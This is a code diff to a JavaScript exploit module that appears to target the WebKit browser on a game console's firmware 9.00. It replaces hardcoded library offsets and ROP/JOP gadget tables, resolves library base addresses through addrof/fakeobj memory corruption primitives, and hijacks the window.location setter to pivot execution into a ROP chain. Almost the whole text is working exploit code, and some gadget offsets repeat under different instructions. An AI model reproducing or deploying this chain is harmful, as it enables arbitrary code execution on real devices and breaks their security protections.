@@ -28,126 +28,196 @@ import {
 
 import * as off from '/module/offset.mjs';
 
-// Firmware 9.00 Offsets
-const OFFSET_wk_vtable_first_element         = 0x104F110;
-const OFFSET_WK_memset_import                = 0x000002A8;
-const OFFSET_WK___stack_chk_fail_import      = 0x00000178;
-const OFFSET_WK_psl_builtin_import           = 0x00000D68;
-const OFFSET_WKR_psl_builtin                  = 0x033BA0;
-const OFFSET_WK_setjmp_gadget_one            = 0x0106ACF7;
-const OFFSET_WK_setjmp_gadget_two            = 0x01ECE1D3;
-const OFFSET_WK_longjmp_gadget_one           = 0x0106ACF7;
-const OFFSET_WK_longjmp_gadget_two           = 0x01ECE1D3;
-const OFFSET_libcint_memset                  = 0x0004F810;
-const OFFSET_libcint_setjmp                  = 0x000BB5BC;
-const OFFSET_libcint_longjmp                 = 0x000BB616;
-const OFFSET_WK2_TLS_IMAGE                   = 0x38E8020;
-const OFFSET_lk___stack_chk_fail             = 0x0001FF60;
-const OFFSET_lk_pthread_create               = 0x00025510;
-const OFFSET_lk_pthread_join                 = 0x0000AFA0;
+// WebKit 9.00 offsets
+const OFFSET_wk_vtable_first_element = 0x104F110;
+const OFFSET_WK___stack_chk_fail_import = 0x00000178;
+const OFFSET_WK_psl_builtin_import = 0xD68;
+const OFFSET_WKR_psl_builtin = 0x33BA0;
+const OFFSET_WK2_TLS_IMAGE = 0x38e8020;
 
-// Global bases (populated in init())
-export let webKitBase;
-export let webKitRequirementBase;
-export let libSceLibcInternalBase;
-export let libKernelBase;
+// libSceLibcInternal 9.00 offsets
+const OFFSET_libcint_memset = 0x0004F810;
+const OFFSET_libcint_setjmp = 0x000BB5BC;
+const OFFSET_libcint_longjmp = 0x000BB616;
 
-// DOM element for base resolution
-var textArea = document.createElement("textarea");
-var nogc = [];
-var syscalls = {};
-export const gadgets = {};
+// libkernel 9.00 offsets
+const OFFSET_lk___stack_chk_fail = 0x0001FF60;
+const OFFSET_lk_pthread_create = 0x00025510;
+const OFFSET_lk_pthread_join = 0x0000AFA0;
 
-// WebKit gadget map for FW9
-const wk_gadgetmap = {
-    "ret":                          0x32,
-    "pop rdi":                      0x319690,
-    "pop rsi":                      0x1F4D6,
-    "pop rdx":                      0x986C,
-    "pop rcx":                      0x657B7,
-    "pop r8":                       0xAFAA71,
-    "pop r9":                       0x422571,
-    "pop rax":                      0x51A12,
-    "pop rsp":                      0x4E293,
-    "mov [rdi], rsi":              0x1A97920,
-    "mov [rdi], rax":              0x10788F7,
-    "mov [rdi], eax":              0x9964BC,
-    "cli ; pop rax":                0x566F8,
-    "sti":                          0x1FBBCC,
-    "mov rax, [rax]":              0x241CC,
-    "mov rax, [rsi]":              0x5106A0,
-    "mov [rax], rsi":              0x1EFD890,
-    "mov [rax], rdx":              0x1426A82,
-    "mov [rax], edx":              0x3B7FE4,
-    "add rax, rsi":                0x170397E,
-    "mov rdx, rax":                0x53F501,
-    "add rax, rcx":                0x2FBCD,
-    "mov rsp, rdi":                0x2048062,
-    "mov rdi, [rax + 8] ; call [rax]": 0x751EE7,
-    "infloop":                      0x7DFF,
-    "mov [rax], cl":               0xC6EAF
-};
+// libSceNKWebKit.sprx
+export let libwebkit_base = null;
+// libkernel_web.sprx
+export let libkernel_base = null;
+// libSceLibcInternal.sprx
+export let libc_base = null;
 
-// WebKit JOP gadget map
-const wkr_gadgetmap = {
-    "xchg rdi, rsp ; call [rsi - 0x79]": 0x1D74F0
-};
+// Gadgets aggiornati per 9.00
+const jop1 = `
+mov rdi, qword ptr [rax + 8]
+call qword ptr [rax]
+`;
+const jop2 = `
+mov rsp, rdi
+ret
+`;
+const jop3 = `
+mov rdx, qword ptr [rdx + 0x50]
+mov ecx, 0xa
+call qword ptr [rax + 0x40]
+`;
+const jop4 = `
+push rdx
+mov edi, 0xac9784fe
+jmp qword ptr [rax]
+`;
+const jop5 = 'pop rsp; ret';
 
-// Secondary WebKit gadgets
-const wk2_gadgetmap = {
-    "mov [rax], rdi":              0xFFDD7,
-    "mov [rax], rcx":              0x2C9ECA,
-    "mov [rax], cx":               0x15A7D52
-};
+const webkit_gadget_offsets = new Map(Object.entries({
+    'pop rax; ret' : 0x51A12,
+    'pop rbx; ret' : 0x1F4D6,
+    'pop rcx; ret' : 0x657B7,
+    'pop rdx; ret' : 0x986C,
 
-// HMD gadget map
-const hmd_gadgetmap = {
-    "add [r8], r12":               0x2BCE1
-};
+    'pop rbp; ret' : 0x319690,
+    'pop rsi; ret' : 0x1F4D6,
+    'pop rdi; ret' : 0x319690,
+    'pop rsp; ret' : 0x4E293,
 
-// IPMI gadget map
-const ipmi_gadgetmap = {
-    "mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]": 0x344B
-};
+    'pop r8; ret' : 0xAFAA71,
+    'pop r9; ret' : 0x422571,
+    'pop r10; ret' : 0x986C,
+    'pop r11; ret' : 0x566F8,
 
-// libc_internal gadgets
-const libcint_gadgetmap = {
-    "memset":                       OFFSET_libcint_memset,
-    "setjmp":                       OFFSET_libcint_setjmp,
-    "longjmp":                      OFFSET_libcint_longjmp
-};
+    'ret' : 0x32,
+    'leave; ret' : 0x1FBBCC,
 
-// kernel gadgets
-const lk_gadgetmap = {
-    "__stack_chk_fail":            OFFSET_lk___stack_chk_fail,
-    "pthread_create":              OFFSET_lk_pthread_create,
-    "pthread_join":                OFFSET_lk_pthread_join
-};
+    'mov [rdi], rsi; ret' : 0x1A97920,
+    'mov [rdi], rax; ret' : 0x10788F7,
+    'mov [rax], rsi; ret' : 0x1EFD890,
+    'mov rax, [rax]; ret' : 0x241CC,
 
-// Initialize bases and gadgets
+    [jop1] : 0x751EE7,
+    [jop2] : 0x2048062,
+    [jop3] : 0x3B7FE4,
+    [jop4] : 0x15A7D52,
+    [jop5] : 0x4E293,
+}));
+
+const libc_gadget_offsets = new Map(Object.entries({
+    'getcontext' : OFFSET_libcint_setjmp,
+    'setcontext' : OFFSET_libcint_longjmp,
+}));
+
+const libkernel_gadget_offsets = new Map(Object.entries({
+    '__error' : 0x160c0,
+    'pthread_create' : OFFSET_lk_pthread_create,
+    'pthread_join' : OFFSET_lk_pthread_join,
+}));
+
+export const gadgets = new Map();
+
+function get_bases() {
+    const textarea = document.createElement('textarea');
+    const webcore_textarea = mem.addrof(textarea).readp(off.jsta_impl);
+    const textarea_vtable = webcore_textarea.readp(0);
+    const libwebkit_base = textarea_vtable.sub(OFFSET_wk_vtable_first_element);
+
+    const stack_chk_fail_import = libwebkit_base.add(OFFSET_WK___stack_chk_fail_import);
+    const stack_chk_fail_addr = resolve_import(stack_chk_fail_import);
+    const libkernel_base = stack_chk_fail_addr.sub(OFFSET_lk___stack_chk_fail);
+
+    const psl_builtin_import = libwebkit_base.add(OFFSET_WK_psl_builtin_import);
+    const psl_builtin_addr = resolve_import(psl_builtin_import);
+    const libc_base = psl_builtin_addr.sub(OFFSET_WKR_psl_builtin);
+
+    return [
+        libwebkit_base,
+        libkernel_base,
+        libc_base,
+    ];
+}
+
+export function init_gadget_map(gadget_map, offset_map, base_addr) {
+    for (const [insn, offset] of offset_map) {
+        gadget_map.set(insn, base_addr.add(offset));
+    }
+}
+
+class Chain900Base extends ChainBase {
+    push_end() {
+        this.push_gadget('leave; ret');
+    }
+
+    push_get_retval() {
+        this.push_gadget('pop rdi; ret');
+        this.push_value(this.retval_addr);
+        this.push_gadget('mov [rdi], rax; ret');
+    }
+
+    push_get_errno() {
+        this.push_gadget('pop rdi; ret');
+        this.push_value(this.errno_addr);
+        this.push_call(this.get_gadget('__error'));
+        this.push_gadget('mov rax, [rax]; ret');
+        this.push_gadget('mov [rdi], eax; ret');
+    }
+}
+
+export class Chain900 extends Chain900Base {
+    constructor() {
+        super();
+        const [rdx, rdx_bak] = mem.gc_alloc(0x58);
+        rdx.write64(off.js_cell, this._empty_cell);
+        rdx.write64(0x50, this.stack_addr);
+        this._rsp = mem.fakeobj(rdx);
+    }
+
+    run() {
+        this.check_allow_run();
+        this._rop.launch = this._rsp;
+        this.dirty();
+    }
+}
+
+export const Chain = Chain900;
+
 export function init(Chain) {
-    // Resolve base addresses via imports
-    const webcore_vt = mem.addrof(textArea).readp(off.jsta_impl);
-    webKitBase = webcore_vt.sub(OFFSET_wk_vtable_first_element);
-    const scf_import = webKitBase.add(OFFSET_WK___stack_chk_fail_import);
-    libKernelBase = resolve_import(scf_import).sub(OFFSET_lk___stack_chk_fail);
-    const memset_imp = webKitBase.add(OFFSET_WK_memset_import);
-    libSceLibcInternalBase = resolve_import(memset_imp).sub(OFFSET_libcint_memset);
-    webKitRequirementBase = webKitBase.add(OFFSET_WKR_psl_builtin);
-
-    // Populate gadget map
-    init_gadget_map(gadgets, wk_gadgetmap, webKitBase);
-    init_gadget_map(gadgets, wkr_gadgetmap, webKitRequirementBase);
-    init_gadget_map(gadgets, wk2_gadgetmap, webKitRequirementBase);
-    init_gadget_map(gadgets, hmd_gadgetmap, webKitRequirementBase);
-    init_gadget_map(gadgets, ipmi_gadgetmap, webKitRequirementBase);
-    init_gadget_map(gadgets, libcint_gadgetmap, libSceLibcInternalBase);
-    init_gadget_map(gadgets, lk_gadgetmap, libKernelBase);
-
-    // Initialize syscalls array (unchanged)
     const syscall_array = [];
-    init_syscall_array(syscall_array, libKernelBase, 300 * KB);
+    [libwebkit_base, libkernel_base, libc_base] = get_bases();
 
-    // Chain setup remains the same as FW8 implementation...
+    init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);
+    init_gadget_map(gadgets, libc_gadget_offsets, libc_base);
+    init_gadget_map(gadgets, libkernel_gadget_offsets, libkernel_base);
+    init_syscall_array(syscall_array, libkernel_base, 300 * KB);
+
+    let gs = Object.getOwnPropertyDescriptor(window, 'location').set;
+    gs = mem.addrof(gs).readp(0x28);
+
+    const size_cgs = 0x18;
+    const [gc_buf, gc_back] = mem.gc_alloc(size_cgs);
+    mem.cpy(gc_buf, gs, size_cgs);
+    gc_buf.write64(0x10, get_gadget(gadgets, jop1));
+
+    const proto = Chain.prototype;
+    const _rop = {get launch() {throw Error('never call')}, 0: 1.1};
+    mem.addrof(_rop).write64(off.js_inline_prop, gc_buf);
+    proto._rop = _rop;
+
+    const rax_ptrs = new BufferView(0x100);
+    const rax_ptrs_p = get_view_vector(rax_ptrs);
+    proto._rax_ptrs = rax_ptrs;
+
+    rax_ptrs.write64(0x70, get_gadget(gadgets, jop2));
+    rax_ptrs.write64(0x30, get_gadget(gadgets, jop3));
+    rax_ptrs.write64(0x40, get_gadget(gadgets, jop4));
+    rax_ptrs.write64(0, get_gadget(gadgets, jop5));
+
+    const jop_buffer_p = mem.addrof(_rop).readp(off.js_butterfly);
+    jop_buffer_p.write64(0, rax_ptrs_p);
+
+    const empty = {};
+    proto._empty_cell = mem.addrof(empty).read64(off.js_cell);
+
     Chain.init_class(gadgets, syscall_array);
 }
